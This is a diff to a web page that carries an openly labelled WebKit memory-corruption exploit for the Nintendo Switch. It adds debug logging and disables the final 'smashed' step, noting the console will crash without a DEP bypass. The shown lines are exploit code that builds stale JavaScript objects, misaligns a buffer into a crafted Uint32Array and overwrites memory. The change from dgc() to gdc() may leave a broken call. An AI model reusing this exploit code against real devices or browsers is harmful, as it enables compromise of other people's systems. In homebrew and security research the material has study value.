@@ -113,7 +113,8 @@ footer {
 
  function go() {
  	document.body.innerHTML = "<center><h1>Running in the 90's...</h1>by <a href='https://twitter.com/qwertyoruiopz'>qwertyoruiopz</a> & implementation by <a href='https://www.twitter.com/Crims0nKaede'>CrimsonMaple</a>, for Nintendo Switch. <br />This may take multiple tries.<br />tyvm NSO, sick webkit exploit (at the time)</center>";
-	dgc();
+	printf("Exploit has been started, collecting garbage.");
+	gdc();
  	setTimeout(go_, 400);
  }
 
@@ -189,14 +190,14 @@ footer {
 				printf('created the JavaScript Object at' + stale[0]);
  				stale[1] = stale[0]
  				bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
- 				stale[0][6] = 0x1337;
+ 				printf('misalligned the javascript object at: ' + stale[0] + ' ');
+				stale[0][6] = 0x1337;
  				mem0 = stale[0];
  				mem1 = bck;
  				mem2 = smsh;
  				bufs.push(stale)
- 				if (smsh.length != 0x10) {
- 					smashed(stale[0]);
- 				}
+ 				printf('smash length is now: 0x' + smsh.length.toString(16));
+				printf("Your Nintendo Switch will likely crash now. Until someone can bypas DEP.");
  				return;
  			}
  		}
